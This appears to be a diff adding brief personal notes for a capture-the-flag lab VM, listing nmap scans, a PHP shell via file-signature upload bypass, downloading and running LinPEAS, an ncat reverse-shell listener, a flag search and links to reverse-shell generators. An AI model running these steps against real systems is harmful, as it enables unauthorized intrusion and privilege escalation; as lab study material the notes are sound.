@@ -1,0 +1,32 @@
+if you find any .ova file import virtualbox
+
+Tools > Network you can find your ip
+
+nmap -sn 127.0.0.1/24
+nmap -F 127.0.0.1
+nmap -sV 127.0.0.1
+nmap -A 127.0.0.1
+nmap -sC -sV 192.168.56.1
+
+* I found an old plugin and attempted to find an exploit, which I also discovered. Then, I used file signatures to bypass security and executed a normal command shell using PHP
+
+ssh user@ip >>> password
+cd /tmp
+python -m http.server 800
+wget 127.0.0.1:800/Linpeas.sh
+chmod +x *
+./Linpeas.sh
+
+ncat -lvnp 1337
+find / -iname "flag*.txt"
+
+Reverse shell online:
+https://www.revshells.com/
+https://weibell.github.io/reverse-shell-generator/
+https://tex2e.github.io/reverse-shell-generator/index.html
+
+
+* Method:
+-> First nmap scan and others recon
+-> find the vulnerability and try to find exploit
+-> then login as a user and then priv to root
